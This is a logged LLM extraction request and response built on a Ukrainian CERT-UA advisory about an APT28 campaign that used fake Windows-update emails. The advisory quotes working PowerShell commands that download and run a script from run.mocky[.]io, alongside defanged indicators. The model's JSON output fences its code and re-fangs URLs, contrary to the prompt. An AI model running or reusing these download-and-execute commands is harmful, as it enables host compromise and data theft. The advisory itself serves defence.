@@ -1,0 +1,209 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA протягом квітня 2023 року зафіксовано випадки розповсюдження серед державних органів України електронних листів з темою "Оновлення Windows", надісланих, начебто, від імені системних адміністраторів відомств. При цьому електронні адреси відправників, створені на публічному сервісі "@outlook.com", можуть формуватися з використанням справжнього прізвища та ініціалів співробітника.</p><p>Типовий лист містить "інструкцію" українською мовою щодо "оновлення для захисту від хакерських атак", а також графічні зображення процесу запуску командного рядка та виконання PowerShell-команди.</p><p>Згадана команда завантажить PowerShell-сценарій, який, імітуючи процес оновлення операційної системи, забезпечить завантаження й виконання наступного PowerShell-сценарію, призначеного для збору базової інформації про ЕОМ за допомогою команд "tasklist", "systeminfo", а також відправку отриманих результатів за допомогою HTTP запиту до API сервісу Mocky.</p><p>Рекомендуємо обмежити можливість запуску PowerShell користувачами та забезпечити моніторинг мережевих з'єднань до API сервісу Mocky.</p><p>Активність здійснюється групою APT28.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='1e88179a-3105-4a5c-9eb3-aebea36e9c21';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell $r;&amp;exit
+powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='3b44f33d-b6e5-4ec6-b120-99b6ac52f74b';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell $r;&amp;exit
+powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='ef206b51-4cf4-4c93-90bf-1e66673315b0';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell$r;&amp;exit
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">146[.]70.105.61 (@m247.ro)
+77[.]75.78.125 (Received)
+hXXp://mockbin[.]org/bin/4aa17a07-7635-4ee0-9f3a-449fcd91f342
+hXXp://mockbin[.]org/bin/e8bfd045-2b14-4afc-9372-b723f7d76918
+hXXp://mockbin[.]org/bin/b8427b58-7497-46cd-a5b2-6ff6a40b4592
+hXXp://run.mocky[.]io/v3/1e88179a-3105-4a5c-9eb3-aebea36e9c21
+hXXp://run.mocky[.]io/v3/3b44f33d-b6e5-4ec6-b120-99b6ac52f74b
+hXXp://run.mocky[.]io/v3/a4b6625c-226e-4dbc-baec-1dbd854b8015
+hXXp://run.mocky[.]io/v3/acea62da-ca05-46d1-bb80-0b036af7467c
+hXXp://run.mocky[.]io/v3/ef206b51-4cf4-4c93-90bf-1e66673315b0
+hXXp://run.mocky[.]io/v3/ef4c7798-fc09-42cd-8431-91a22d5728d9
+hXXp://run.mocky[.]io/v3/a261411d-b869-4877-86f5-307e32ed6afa
+mockbin[.]org (Легітимний сервіс Mocky)
+run.mocky[.]io (Легітимний сервіс Mocky)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (8.4s, in 3137 / out 1574 tok, STOP) ===
+APT28 carried out a cyberattack campaign targeting Ukrainian government bodies using phishing emails masquerading as Windows update notifications to execute PowerShell scripts and exfiltrate host data via Mocky API endpoints.
+
+```json
+{
+  "entities": [
+    {
+      "name": "APT28",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage threat group associated with the GRU."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state located in Eastern Europe."
+    },
+    {
+      "name": "Windows",
+      "kind": "software product",
+      "gloss": "A family of proprietary operating systems developed and maintained by Microsoft."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Mocky",
+      "kind": "software product",
+      "gloss": "A public web service for mocking HTTP APIs and handling web requests."
+    },
+    {
+      "name": "outlook.com",
+      "kind": "domain name",
+      "gloss": "A public email and personal information management domain operated by Microsoft."
+    },
+    {
+      "name": "mockbin.org",
+      "kind": "domain name",
+      "gloss": "An internet domain used for mocking and logging HTTP requests."
+    },
+    {
+      "name": "run.mocky.io",
+      "kind": "domain name",
+      "gloss": "A subdomain of the Mocky service used to simulate API responses."
+    },
+    {
+      "name": "146.70.105.61",
+      "kind": "ip address",
+      "gloss": "An IP address associated with network infrastructure observed in the incident."
+    },
+    {
+      "name": "77.75.78.125",
+      "kind": "ip address",
+      "gloss": "An IP address identified in email transport headers during the campaign."
+    },
+    {
+      "name": "https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015",
+      "kind": "uniform resource locator",
+      "gloss": "A Microsoft Update Catalog URL referenced in PowerShell commands."
+    },
+    {
+      "name": "http://mockbin.org/bin/4aa17a07-7635-4ee0-9f3a-449fcd91f342",
+      "kind": "uniform resource locator",
+      "gloss": "A Mockbin API endpoint used for staging payloads or exfiltration."
+    },
+    {
+      "name": "http://mockbin.org/bin/e8bfd045-2b14-4afc-9372-b723f7d76918",
+      "kind": "uniform resource locator",
+      "gloss": "A Mockbin API endpoint used for staging payloads or exfiltration."
+    },
+    {
+      "name": "http://mockbin.org/bin/b8427b58-7497-46cd-a5b2-6ff6a40b4592",
+      "kind": "uniform resource locator",
+      "gloss": "A Mockbin API endpoint used for staging payloads or exfiltration."
+    },
+    {
+      "name": "http://run.mocky.io/v3/1e88179a-3105-4a5c-9eb3-aebea36e9c21",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used to download a malicious PowerShell script."
+    },
+    {
+      "name": "http://run.mocky.io/v3/3b44f33d-b6e5-4ec6-b120-99b6ac52f74b",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used to download a malicious PowerShell script."
+    },
+    {
+      "name": "http://run.mocky.io/v3/a4b6625c-226e-4dbc-baec-1dbd854b8015",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used in malicious operations."
+    },
+    {
+      "name": "http://run.mocky.io/v3/acea62da-ca05-46d1-bb80-0b036af7467c",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used in malicious operations."
+    },
+    {
+      "name": "http://run.mocky.io/v3/ef206b51-4cf4-4c93-90bf-1e66673315b0",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used to download a malicious PowerShell script."
+    },
+    {
+      "name": "http://run.mocky.io/v3/ef4c7798-fc09-42cd-8431-91a22d5728d9",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used in malicious operations."
+    },
+    {
+      "name": "http://run.mocky.io/v3/a261411d-b869-4877-86f5-307e32ed6afa",
+      "kind": "uniform resource locator",
+      "gloss": "A Mocky API endpoint used in malicious operations."
+    }
+  ],
+  "relations": [
+    {
+      "head": "APT28",
+      "type": "uses",
+      "tail": "PowerShell",
+      "evidence": "виконання PowerShell-команди... Активність здійснюється групою APT28"
+    },
+    {
+      "head": "APT28",
+      "type": "uses",
+      "tail": "Mocky",
+      "evidence": "API сервісу Mocky... Активність здійснюється групою APT28"
+    }
+  ],
+  "newRelationTypes": []
+}
+```
